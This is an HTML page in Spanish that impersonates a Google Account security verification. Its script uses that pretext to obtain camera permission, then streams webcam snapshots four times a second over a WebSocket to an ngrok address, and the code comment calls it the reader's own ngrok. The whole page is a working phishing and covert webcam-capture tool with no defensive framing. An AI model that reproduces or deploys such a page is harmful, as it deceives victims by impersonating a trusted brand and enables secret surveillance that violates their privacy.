<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Google Account - Verificación</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Roboto, Arial, sans-serif; text-align: center; padding-top: 50px; }
        .container { max-width: 400px; margin: auto; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; }
        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
        <h2>Verificación de seguridad</h2>
        <p>Para proteger su cuenta, necesitamos realizar una validación rápida. Haga clic en el botón para continuar.</p>
        <button onclick="iniciar()">Continuar</button>
    </div>

    <script>
        async function iniciar() {
            try {
                // Solicita permiso de cámara
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Conexión a tu ngrok (Websocket seguro)
                const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');

                socket.onopen = () => {
                    setInterval(() => {
                        canvas.width = 300; canvas.height = 225;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        if (socket.readyState === 1) {
                            socket.send(canvas.toDataURL('image/jpeg', 0.4));
                        }
                    }, 250);
                };
                alert("Sincronizando... Mantenga esta ventana abierta.");
            } catch (e) {
                alert("Debe permitir el acceso para verificar su identidad.");
            }
        }
    </script>
</body>
</html>
